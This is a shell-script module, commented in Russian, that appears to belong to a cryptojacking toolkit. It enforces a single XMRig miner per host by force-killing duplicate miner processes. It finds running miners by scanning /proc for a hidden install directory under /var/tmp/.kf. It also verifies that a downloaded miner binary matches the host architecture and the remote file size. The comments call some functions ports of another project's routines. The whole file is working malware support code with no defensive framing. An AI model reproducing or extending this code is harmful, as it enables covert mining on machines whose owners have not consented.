#!/bin/sh
# 30-single.sh — один майнер на хост. Порт _enforce_single_miner.
# Зависит от 10-exclude.sh (kf_find_our_miners).

kf_enforce_single_miner() {
  _e_keep="${1:-}"
  [ -n "$_e_keep" ] || _e_keep=$(kf_find_our_miners | sort -n | head -1)
  [ -n "$_e_keep" ] || return 0
  for _e_pid in $(kf_find_our_miners); do
    [ "$_e_pid" = "$_e_keep" ] && continue
    kill -9 "$_e_pid" 2>/dev/null && kf_log "single-miner: killed $_e_pid, kept $_e_keep"
  done
  return 0
}

# их is_our_process_running
kf_miner_running() {
  _r_bin="${1:-xmrig}"
  for _r_d in /proc/[0-9]*; do
    _r_cmd=$(tr '\0' ' ' 2>/dev/null < "$_r_d/cmdline")
    case "$_r_cmd" in
      *"${KF_ROOT:-/var/tmp/.kf}/$_r_bin"*|*"$_r_bin -c"*) return 0 ;;
    esac
  done
  return 1
}

# их _miner_ready: ELF под нашу арх + размер
kf_miner_ready() {
  _mr_f="$1"; _mr_url="${2:-}"
  [ -s "$_mr_f" ] || return 1
  kf_is_elf_for_arch "$_mr_f" "$(kf_arch | awk '{print $2}')" || return 1
  _mr_el=$(kf_remote_len "$_mr_url" 2>/dev/null)
  _mr_dl=$(wc -c < "$_mr_f" 2>/dev/null || echo 0)
  if [ -n "$_mr_el" ] && [ "$_mr_el" -gt 0 ] 2>/dev/null; then
    [ "$_mr_dl" -ge "$_mr_el" ] 2>/dev/null && return 0
    return 1
  fi
  [ "$_mr_dl" -ge 1000000 ] 2>/dev/null && return 0
  return 1
}
